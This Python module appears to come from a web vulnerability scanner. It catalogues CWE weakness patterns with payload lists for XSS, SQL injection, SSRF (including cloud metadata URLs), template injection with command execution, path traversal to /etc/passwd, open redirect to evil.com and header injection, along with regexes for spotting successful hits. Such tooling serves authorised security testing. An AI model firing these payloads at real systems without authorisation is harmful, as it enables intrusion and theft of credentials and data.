"""Vulnerability knowledge base.

Embedded CWE weakness patterns, attack vectors, and payload generators
for common web vulnerability classes.  Inspired by h1-brain's approach
of matching weakness patterns to target assets.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any


@dataclass
class WeaknessPattern:
    """A known weakness type with payloads and detection hints."""

    cwe_id: str
    name: str
    category: str
    description: str
    payloads: list[str] = field(default_factory=list)
    detection_patterns: list[str] = field(default_factory=list)
    severity_default: str = "medium"
    applicable_contexts: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Built-in weakness catalog
# ---------------------------------------------------------------------------

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '{{7*7}}',
    '${7*7}',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '" onfocus="alert(1)" autofocus="',
    "';alert(String.fromCharCode(88,83,83))//",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "1' AND SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' ORDER BY 1--",
    "admin'--",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://0x7f000001",
    "http://2130706433",
    "file:///etc/passwd",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{config}}",
    "{{self.__init__.__globals__}}",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%2f%2f",
    "////evil.com",
    "https:evil.com",
    "//%0d%0aevil.com",
]

HEADER_INJECTION_PAYLOADS = [
    "value\r\nInjected-Header: true",
    "value%0d%0aInjected-Header:%20true",
    "value\nX-Injected: true",
]

CORS_ORIGINS = [
    "https://evil.com",
    "null",
    "https://target.evil.com",
]


# ---------------------------------------------------------------------------
# CWE mapping for vulnerability types
# ---------------------------------------------------------------------------

CWE_MAP: dict[str, WeaknessPattern] = {}


def _register(wp: WeaknessPattern) -> None:
    CWE_MAP[wp.cwe_id] = wp


_register(WeaknessPattern(
    cwe_id="CWE-79",
    name="Cross-Site Scripting (XSS)",
    category="injection",
    description="Improper neutralization of input during web page generation",
    payloads=XSS_PAYLOADS,
    detection_patterns=[
        r"<script>alert\(1\)</script>",
        r"onerror=alert",
        r"onload=alert",
    ],
    severity_default="medium",
    applicable_contexts=["query_param", "form_field", "header", "json_value"],
))

_register(WeaknessPattern(
    cwe_id="CWE-89",
    name="SQL Injection",
    category="injection",
    description="Improper neutralization of special elements used in an SQL command",
    payloads=SQLI_PAYLOADS,
    detection_patterns=[
        r"(?i)sql\s*syntax",
        r"(?i)mysql_fetch",
        r"(?i)ORA-\d{5}",
        r"(?i)pg_query",
        r"(?i)unclosed\s+quotation\s+mark",
        r"(?i)microsoft.*odbc",
    ],
    severity_default="critical",
    applicable_contexts=["query_param", "form_field", "json_value", "cookie"],
))

_register(WeaknessPattern(
    cwe_id="CWE-918",
    name="Server-Side Request Forgery (SSRF)",
    category="injection",
    description="The server can be induced to make requests to unintended locations",
    payloads=SSRF_PAYLOADS,
    detection_patterns=[
        r"root:.*:0:0:",
        r"ami-id",
        r"instance-id",
        r"computeMetadata",
    ],
    severity_default="high",
    applicable_contexts=["query_param", "json_value", "form_field"],
))

_register(WeaknessPattern(
    cwe_id="CWE-1336",
    name="Server-Side Template Injection (SSTI)",
    category="injection",
    description="User input is embedded into server-side templates unsafely",
    payloads=SSTI_PAYLOADS,
    detection_patterns=[
        r"\b49\b",  # 7*7 = 49; may match other occurrences — verify with context
        r"__class__",
        r"__subclasses__",
    ],
    severity_default="critical",
    applicable_contexts=["query_param", "form_field", "json_value"],
))

_register(WeaknessPattern(
    cwe_id="CWE-22",
    name="Path Traversal",
    category="injection",
    description="Improper limitation of a pathname to a restricted directory",
    payloads=PATH_TRAVERSAL_PAYLOADS,
    detection_patterns=[
        r"root:.*:0:0:",
        r"\[extensions\]",
        r"# /etc/passwd",
    ],
    severity_default="high",
    applicable_contexts=["query_param", "path_segment", "form_field"],
))

_register(WeaknessPattern(
    cwe_id="CWE-601",
    name="Open Redirect",
    category="redirect",
    description="URL redirection to untrusted site",
    payloads=OPEN_REDIRECT_PAYLOADS,
    detection_patterns=[],  # detected via Location header
    severity_default="medium",
    applicable_contexts=["query_param"],
))

_register(WeaknessPattern(
    cwe_id="CWE-942",
    name="CORS Misconfiguration",
    category="config",
    description="Overly permissive Cross-Origin Resource Sharing policy",
    payloads=[],
    detection_patterns=[
        r"Access-Control-Allow-Origin:\s*\*",
        r"Access-Control-Allow-Credentials:\s*true",
    ],
    severity_default="medium",
    applicable_contexts=["origin_header"],
))

_register(WeaknessPattern(
    cwe_id="CWE-113",
    name="HTTP Response Splitting / Header Injection",
    category="injection",
    description="Improper neutralization of CRLF sequences in HTTP headers",
    payloads=HEADER_INJECTION_PAYLOADS,
    detection_patterns=[
        r"Injected-Header",
        r"X-Injected",
    ],
    severity_default="medium",
    applicable_contexts=["query_param", "header"],
))

_register(WeaknessPattern(
    cwe_id="CWE-200",
    name="Information Disclosure",
    category="info",
    description="Exposure of sensitive information to unauthorized actors",
    payloads=[],
    detection_patterns=[
        r"(?i)stack\s*trace",
        r"(?i)traceback",
        r"(?i)internal\s*server\s*error",
        r"(?i)debug\s*mode",
        r"(?i)x-powered-by",
        r"(?i)server:\s*(apache|nginx|iis|tomcat)",
    ],
    severity_default="low",
    applicable_contexts=["response_header", "response_body"],
))


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def get_payloads_for_context(context: str) -> list[tuple[str, WeaknessPattern]]:
    """Return (payload, weakness) pairs applicable to the given context."""
    results: list[tuple[str, WeaknessPattern]] = []
    for wp in CWE_MAP.values():
        if context in wp.applicable_contexts:
            for payload in wp.payloads:
                results.append((payload, wp))
    return results


def check_response_for_weakness(
    body: str,
    headers: dict[str, str],
    weakness: WeaknessPattern,
) -> list[str]:
    """Check if a response body/headers match detection patterns."""
    hits: list[str] = []
    combined = body + "\n" + "\n".join(f"{k}: {v}" for k, v in headers.items())
    for pattern in weakness.detection_patterns:
        if re.search(pattern, combined):
            hits.append(f"Matched {weakness.name} pattern: {pattern}")
    return hits


def get_weakness_by_cwe(cwe_id: str) -> WeaknessPattern | None:
    """Look up a weakness pattern by CWE ID."""
    return CWE_MAP.get(cwe_id)


def get_all_weaknesses() -> list[WeaknessPattern]:
    """Return all registered weakness patterns."""
    return list(CWE_MAP.values())


def suggest_attack_vectors(
    endpoint_url: str,
    parameters: list[str],
    requires_auth: bool,
) -> list[dict[str, Any]]:
    """Suggest attack vectors for an endpoint based on its characteristics.

    Mimics h1-brain's approach: suggest weaknesses that haven't been tested
    based on the endpoint's parameter profile.
    """
    suggestions: list[dict[str, Any]] = []

    has_url_params = any(
        p.lower() in ("url", "redirect", "next", "return", "goto", "link",
                       "callback", "redir", "returnto", "redirect_uri")
        for p in parameters
    )
    has_file_params = any(
        p.lower() in ("file", "path", "filename", "filepath", "template",
                       "page", "include", "doc", "document", "folder")
        for p in parameters
    )
    has_id_params = any(
        p.lower() in ("id", "user_id", "account_id", "uid", "pid", "order_id")
        for p in parameters
    )

    # Always suggest injection testing on endpoints with params
    if parameters:
        suggestions.append({
            "cwe": "CWE-79",
            "reason": "Endpoint has input parameters — test for reflected XSS",
            "priority": "high" if not requires_auth else "medium",
        })
        suggestions.append({
            "cwe": "CWE-89",
            "reason": "Endpoint has input parameters — test for SQL injection",
            "priority": "critical",
        })
        suggestions.append({
            "cwe": "CWE-1336",
            "reason": "Endpoint has input parameters — test for SSTI",
            "priority": "high",
        })

    if has_url_params:
        suggestions.append({
            "cwe": "CWE-918",
            "reason": "URL-like parameter found — test for SSRF",
            "priority": "high",
        })
        suggestions.append({
            "cwe": "CWE-601",
            "reason": "Redirect-like parameter found — test for open redirect",
            "priority": "medium",
        })

    if has_file_params:
        suggestions.append({
            "cwe": "CWE-22",
            "reason": "File/path parameter found — test for path traversal",
            "priority": "high",
        })

    if has_id_params and requires_auth:
        suggestions.append({
            "cwe": "CWE-639",
            "reason": "ID parameter on authenticated endpoint — test for IDOR",
            "priority": "critical",
        })

    # CORS is always worth testing
    suggestions.append({
        "cwe": "CWE-942",
        "reason": "Test CORS policy",
        "priority": "medium",
    })

    return suggestions
